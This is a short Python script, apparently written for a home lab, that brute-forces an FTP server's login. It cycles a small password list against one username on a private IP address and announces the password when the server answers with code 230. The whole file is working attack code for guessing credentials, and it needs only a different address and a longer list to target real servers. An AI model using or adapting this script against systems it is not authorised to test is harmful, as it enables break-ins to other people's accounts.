#! /usr/bin/python


import socket
import sys
# import re
# import print_
from colorama import Fore, Back, Style
# import colored


IP_ADDRESS = '192.168.84.137'
PORT = 21

# attempt to connect to ftp server
def connection(uname, password):

    # specify address family --
        # socket.AF_INET = ip family for IPV4
        # socket.SOCK_STREAM = TCP socket type

    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    
    s = clientSocket
    
    # shows the current credential combo
    print('[*] trying ' + uname + ':' + password)

    # attempt connecting to ftp 
    s.connect((IP_ADDRESS, PORT))

    # recieve response in 1024 bytes
    response = s.recv(1024)

    s.send(( 'USER ' +uname + '\r\n').encode())

    response = s.recv(1024)

    s.send(('PASS '+ password + '\r\n').encode())

    response = s.recv(3)

    s.send(('QUIT\r\n').encode())

    s.close()

    return response



# static for my vm
uname = 'abc'

# super small list, just trying to verify it is functional
passwords = ['abc', 'redteam', 'password123', 'yuck','123']

# lil loop
for password in passwords:
    print(Fore.WHITE + Style.BRIGHT+ 'Trying ...' + Style.RESET_ALL)

    attempt = connection(uname, password)
    # print_('...')
    # print(attempt)
    if attempt==b'230':
        print(Fore.YELLOW +'[*] Congrats, password is:' + password)
        sys.exit(0)
    else:
        print('Sorry, sucker')
        print()

 



